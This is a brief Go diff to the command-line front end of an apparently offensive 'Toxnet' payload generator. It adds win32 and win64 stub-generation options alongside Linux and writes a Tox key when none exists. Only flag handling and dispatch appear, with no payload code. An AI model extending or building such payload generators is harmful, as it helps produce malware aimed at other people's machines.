@@ -22,8 +22,8 @@ func Usage() {
 		flag.PrintDefaults()
 	}
 
-	flag.StringVar(&outputFile, "o", "linux_payload", "Specify output file: -o [filename]")
-	flag.StringVar(&payloadType, "t", "", "Generate a Toxnet payload: linux, windows")
+	flag.StringVar(&outputFile, "o", "generic_payload", "Specify output file: -o [filename]")
+	flag.StringVar(&payloadType, "t", "", "Generate a Toxnet payload: linux, win32, win64")
 
 	flag.Parse()
 
@@ -32,6 +32,18 @@ func Usage() {
 			ToxWrite()
 		}
 		GenerateLinuxStub(outputFile)
+		os.Exit(0)
+	} else if strings.ToLower(payloadType) == "win32" {
+		if _, err := os.Stat(Tox_key); errors.Is(err, os.ErrNotExist) {
+			ToxWrite()
+		}
+		GenerateWin32Stub(outputFile)
+		os.Exit(0)
+	} else if strings.ToLower(payloadType) == "win64" {
+		if _, err := os.Stat(Tox_key); errors.Is(err, os.ErrNotExist) {
+			ToxWrite()
+		}
+		GenerateWin64Stub(outputFile)
 		os.Exit(0)
 	}
 }
